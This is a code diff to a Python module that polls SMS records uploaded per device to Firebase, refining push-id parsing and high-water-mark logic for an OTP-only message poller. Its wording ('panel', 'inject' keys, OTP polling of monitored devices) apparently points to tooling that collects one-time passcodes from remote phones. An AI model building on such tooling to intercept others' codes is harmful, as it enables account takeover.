@@ -226,6 +226,12 @@ def clear_sms_baseline(device: Device) -> None:
 
 
 def _message_push_id(record: dict[str, Any]) -> int | None:
+    raw_id = record.get("push_id") if record.get("push_id") is not None else record.get("id")
+    if raw_id is not None:
+        try:
+            return int(raw_id)
+        except (TypeError, ValueError):
+            pass
     firebase_key = str(record.get("firebase_key") or "")
     if not firebase_key.startswith("messages/"):
         return None
@@ -234,6 +240,27 @@ def _message_push_id(record: dict[str, Any]) -> int | None:
         return int(leaf)
     except ValueError:
         return None
+
+
+def _is_incoming_sms_record(record: dict[str, Any]) -> bool:
+    sender = str(record.get("sender") or "")
+    body = str(record.get("message") or "")
+    if not body.strip():
+        return False
+    if _is_poll_noise_record(sender, body) or _is_outgoing_firebase_log(sender, body):
+        return False
+    return True
+
+
+def _max_incoming_push_id(records: list[dict[str, Any]]) -> int:
+    ids: list[int] = []
+    for record in records:
+        if not _is_incoming_sms_record(record):
+            continue
+        push_id = _message_push_id(record)
+        if push_id is not None:
+            ids.append(push_id)
+    return max(ids) if ids else 0
 
 
 def _messages_high_water(device: Device) -> int:
@@ -609,11 +636,22 @@ def _parse_sms_entry(firebase_key: str, value: Any) -> dict[str, Any] | None:
             if received_at:
                 break
 
+    push_id: int | None = None
+    for raw in (value.get("id"), value.get("push_id"), value.get("key")):
+        if raw is None:
+            continue
+        try:
+            push_id = int(raw)
+            break
+        except (TypeError, ValueError):
+            continue
+
     return {
         "firebase_key": firebase_key,
         "sender": sender,
         "message": body,
         "received_at": received_at,
+        "push_id": push_id,
     }
 
 
@@ -710,21 +748,26 @@ def _extract_sms_records(path: str, value: Any) -> list[dict[str, Any]]:
 
 
 async def _fetch_messages_high_water(root: str, device_id: str, timeout: float) -> int:
-    """Latest push-id under messages/{device_id} at monitoring start."""
-    url = f"{root}/messages/{device_id}.json?orderBy=%22%24key%22&limitToLast=1"
+    """Latest incoming SMS push-id — ignore inject/__OUT__ keys (mix with panel ids)."""
+    records = await _fetch_path_records(root, f"messages/{device_id}", timeout)
+    incoming_hw = _max_incoming_push_id(records)
+    if incoming_hw:
+        return incoming_hw
+    url = f"{root}/messages/{device_id}.json?orderBy=%22%24key%22&limitToLast=8"
     try:
         data = await _fetch_json(url, timeout=timeout)
     except httpx.HTTPError:
         return 0
     if not isinstance(data, dict) or not data:
         return 0
-    ids: list[int] = []
-    for key in data.keys():
-        try:
-            ids.append(int(key))
-        except ValueError:
-            continue
-    return max(ids) if ids else 0
+    prefix = f"messages/{device_id}"
+    parsed: list[dict[str, Any]] = []
+    for key, val in data.items():
+        if isinstance(val, dict):
+            rec = _parse_sms_entry(f"{prefix}/{key}", val)
+            if rec:
+                parsed.append(rec)
+    return _max_incoming_push_id(parsed)
 
 
 async def _fetch_messages_shallow_keys(root: str, device_id: str, timeout: float) -> set[str]:
@@ -1166,7 +1209,6 @@ async def _poll_messages_otp_only(
         sender = str(record.get("sender") or "Unknown")
         body = str(record.get("message") or "")
         if _is_poll_noise_record(sender, body) or _is_outgoing_firebase_log(sender, body):
-            _bump_messages_high_water(device, push_id)
             mark_sms_keys_seen(device, {_record_dedup_key(record)})
             continue
         candidates.append(record)
